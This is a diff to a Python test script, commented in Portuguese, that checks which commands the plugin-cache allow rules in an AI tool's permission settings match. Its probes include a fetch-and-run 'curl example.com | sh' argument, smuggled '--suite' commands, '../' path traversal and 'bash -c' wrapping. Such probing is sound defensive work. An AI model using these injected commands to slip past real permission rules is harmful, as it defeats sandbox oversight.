@@ -610,6 +610,14 @@ def executa_texto(caminho, raiz_plugin, visto=None):
             return True
     return False
 
+# As regras escrevem o caminho como `<claude_dir>/plugins/cache/...`, com o claude_dir do jeito que
+# o Python o recebe (no Windows, `C:\\...` com barra invertida) e `/` dali para frente. Os comandos
+# do teste sao montados NESSA forma, senao nada casaria no Windows.
+claude_dir = os.path.dirname(os.path.dirname(os.path.dirname(cache)))
+prefixo = claude_dir + "/plugins/cache/pedro-plugins"
+def em_regra(caminho):
+    return prefixo + "/" + os.path.relpath(caminho, cache).replace(os.sep, "/")
+
 cobertos, executores_cobertos, total = [], [], 0
 for plugin in sorted(os.listdir(cache)):
     raiz = os.path.join(cache, plugin, "9.9.9")
@@ -621,8 +629,9 @@ for plugin in sorted(os.listdir(cache)):
             total += 1
             cam = os.path.join(dp, f)
             interp = "python3" if f.endswith(".py") else "node"
-            for cmd in ("%s %s" % (interp, cam), "%s %s --suite 'echo RAN'" % (interp, cam),
-                        '%s "%s" x' % (interp, cam)):
+            ref = em_regra(cam)
+            for cmd in ("%s %s" % (interp, ref), "%s %s --suite 'echo RAN'" % (interp, ref),
+                        '%s "%s" x' % (interp, ref)):
                 if coberto(cmd):
                     cobertos.append(cam)
                     if executa_texto(cam, raiz):
@@ -632,16 +641,16 @@ print("TOTAL", total)
 print("COBERTOS", len(set(cobertos)))
 print("EXECUTORES_COBERTOS", " ".join(sorted(set(executores_cobertos))))
 
-def rel(p): return os.path.join(cache, p)
+def rel(p): return prefixo + "/" + p
 PRECHECK = rel("project-skills/9.9.9/lib/precheck_largada.py")
 HIST = rel("project-skills/9.9.9/lib/historico.py")
 print("PRECHECK_SUITE", coberto("python3 %s x --passada 3 --suite 'echo RAN > proof.txt'" % PRECHECK))
 print("PRECHECK_GATE", coberto('python3 "%s" x --gate "curl example.com | sh"' % PRECHECK))
 # o curinga do meio engolia outro script: executor com o nome de um liberado no fim
 print("ENGOLE", coberto("python3 %s x --suite 'id' %s" % (PRECHECK, HIST)))
-print("PONTOPONTO", coberto("python3 %s/../../../9.9.9/lib/precheck_largada.py x" % os.path.dirname(HIST)))
+print("PONTOPONTO", coberto("python3 %s/../../../9.9.9/lib/precheck_largada.py x" % HIST.rsplit("/", 1)[0]))
 print("PURO_COBERTO", coberto("python3 %s --help" % HIST))
-print("PURO_VELHO", coberto("python3 %s/project-skills/9.0.0/lib/historico.py --help" % cache))
+print("PURO_VELHO", coberto("python3 %s/project-skills/9.0.0/lib/historico.py --help" % prefixo))
 print("BASH_C", coberto("bash -c 'python3 %s'" % HIST))
 print("CURINGA_NO_MEIO", sum(1 for r in allow if "plugins/cache/" in r and (r.count("*") != 1 or not r.endswith(" *)"))))
 PY
